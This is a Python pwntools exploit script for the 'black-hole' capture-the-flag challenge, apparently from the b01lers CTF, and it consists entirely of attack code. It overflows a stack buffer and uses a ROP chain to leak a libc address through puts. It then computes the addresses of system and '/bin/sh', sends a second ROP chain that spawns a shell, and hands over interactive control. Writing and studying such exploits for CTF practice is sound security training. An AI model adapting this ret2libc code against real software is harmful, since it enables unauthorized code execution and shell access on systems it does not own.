from pwn import *


p=process("./black-hole")
#p=remote("pwn.ctf.b01lers.com", 1005)
puts_plt=0x0000000000400730
pop_rdi=0x0000000000400dc3
ret=0x00000000004006fe
entry=0x4007e0
libc_start_main=0x0000000000601ff0
payload=""
payload+="\x90"*148
payload+=p64(pop_rdi)
payload+=p64(libc_start_main)
payload+=p64(puts_plt)
payload+=p64(entry)
p.sendline(payload)
p.sendline("d\n"*7)
p.recvuntil("you died!\n")
data=p.recvline()[:-1]
leak=u64(data.ljust(8,"\x00"))

base=leak-0x021ab0
system=base+0x04f440
binsh=base+0x1b3e9a
print "leak :",hex(leak)
print "base :",hex(base)
print "system :",hex(system)
print "binsh :",hex(binsh)
payload=""
payload+="\x90"*148
payload+=p64(ret)
payload+=p64(pop_rdi)
payload+=p64(binsh)
payload+=p64(system)
pause()
p.sendline(payload)
p.interactive()






